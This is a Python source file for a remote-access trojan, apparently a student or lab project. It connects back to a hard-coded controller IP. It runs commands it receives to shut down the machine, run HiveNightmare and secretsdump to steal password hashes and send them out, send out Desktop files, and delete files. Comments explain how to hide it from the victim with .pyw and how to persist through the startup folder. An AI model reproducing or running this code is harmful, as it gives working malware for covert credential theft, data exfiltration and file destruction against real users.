import socket
import os
import subprocess
import sys
from subprocess import call

FORMAT = "utf-8"

# installing the required packages
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pycryptodomex'])
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'impacket'])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.26.244", 1234))
# this file should be run in the background so the person using the pc is not aware of the process running
# For this to happen, use the extension.pyw,
# which will cause the script to be executed by pythonw.exe by default.
# This prevents the terminal window from appearing when the computer is first booted.
# https://coduber.com/run-python-script-constantly-in-background/


# Additionally, we also want to look at making the tool automatically boot up on start up.
# This can be done by adding the exe on the start-up directory but not essential

# For the cmd part
# https://www.stackvidhya.com/execute-system-command-or-shell-command-python/
# https://datatofish.com/command-prompt-python/

while (True):
    msg = s.recv(1024)
    decodedMsg = msg.decode("utf-8")
    print(decodedMsg)
    if decodedMsg == "s":
        print('Shutting Down')
        #send confirmation
        s.sendall(bytes("shutting down","utf-8"))
        os.system("shutdown /s /t 1")
        # The command shuts down the pc so avoid running it
    elif decodedMsg == "openCalc":
        os.system('cmd /c "calc"')
        s.sendall(bytes("opened calc","utf-8"))

    elif decodedMsg == "showdesktop":
        dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Desktop"
        result = subprocess.run("dir", cwd=dir, stdout=subprocess.PIPE, shell=True)
        s.sendall(bytes(result.stdout.decode(), "utf-8"))
    # elif decodedMsg == "test1":
    #     command = "dir Desktop & echo 'All the files and folders are listed'"
    #     result = subprocess.run(command, stdout=subprocess.PIPE, shell=True)
    #     s.sendall(bytes(result.stdout.decode(), "utf-8"))
    
    # code to retrieve the registry files (hives)
    elif decodedMsg == "retrieveh":
        dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Downloads"
        cmdline = "start .\HiveNightmare.exe"
        subprocess.call(cmdline, cwd=dir, shell=True) # run `cmdline` in `dir`
        s.sendall(bytes("done", "utf-8"))
    # dump the hashes and send them via the connection
    elif decodedMsg == "hashdump":
        dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Downloads"
        systemN = ""
        securityN = ""
        samN = ""
        for i in os.listdir(dir):
            if 'SYSTEM' in i:
                systemN = i
            elif 'SECURITY' in i:
                securityN = i
            elif 'SAM' in i:
                samN = i

        cmdline2 = "python secretsdump.py -system " + systemN + " -security " + securityN + " -sam " + samN + " local"
        resulth = subprocess.run(cmdline2, cwd=dir, stdout=subprocess.PIPE, shell=True)
        print(resulth.stdout.decode())
        s.sendall(bytes(resulth.stdout.decode(), "utf-8"))
        #s.sendall(bytes(samN, "utf-8"))  
    # just a response so we don't break the message response pattern  
    elif decodedMsg == "getaccess":
        s.sendall(bytes("nice", "utf-8"))
    # https://docs.python.org/3/library/subprocess.html#subprocess.Popen.communicate here we can see that we can get
    # output from certain executions, so maybe we can use this to execute commands one by one could include like
    # command and then choose which command to use
    #https://www.computerhope.com/issues/chusedos.htm

    elif decodedMsg == "SendFiles-Desktop":
        dir =  "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Desktop"
        result = subprocess.run("dir", cwd=dir, stdout=subprocess.PIPE, shell=True)
        s.sendall(bytes(result.stdout.decode(), "utf-8"))
        msg = s.recv(1024)
        decodedMsg = msg.decode("utf-8")
        if decodedMsg == "cancel":
            s.sendall(bytes("cancelled", "utf-8"))

        else:
            file = dir + "\\" + decodedMsg
            f = open(file, "rt")
            message = f.read(2048)
            while message:
                print('Sending...')
                s.sendall(bytes(message, "utf-8"))
                message = f.read(2048)
            f.close()
            s.sendall(bytes("done sending","utf-8"))
            
            #https: // stackoverflow.com / questions / 27241804 / sending - a - file - over - tcp - sockets - in -python
            #rb needed for sending binary file

    elif decodedMsg == "DeleteFiles-Desktop":
        dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Desktop"
        result = subprocess.run("dir", cwd=dir, stdout=subprocess.PIPE, shell=True)
        s.sendall(bytes(result.stdout.decode(), "utf-8"))
        msg = s.recv(1024)
        decodedMsg = msg.decode("utf-8")
        if decodedMsg == "cancel":
            s.sendall(bytes("cancelled", "utf-8"))

        else:
            command = "del " + decodedMsg
            #might not need shell and stdout
            subprocess.run(command, cwd=dir, stdout=subprocess.PIPE, shell=True)
            s.sendall(bytes("File Deleted", "utf-8"))




    else:
        s.sendall(bytes("Invalid Command", "utf-8"))



